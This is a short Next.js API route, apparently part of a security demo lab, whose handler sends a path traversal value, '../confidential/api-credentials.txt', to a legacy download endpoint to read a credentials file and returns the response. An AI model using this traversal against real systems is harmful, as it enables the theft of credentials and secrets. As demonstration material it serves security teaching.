import { NextResponse } from "next/server";
import { proxyChat } from "@/lib/demoLab";

const TRAVERSAL_FILE = "../confidential/api-credentials.txt";

export async function GET() {
  try {
    const res = await proxyChat(
      `/legacy/download?file=${encodeURIComponent(TRAVERSAL_FILE)}`
    );
    const data = await res.json();
    return NextResponse.json(data, { status: res.status });
  } catch {
    return NextResponse.json(
      { detail: "chat-rag service unavailable" },
      { status: 503 }
    );
  }
}
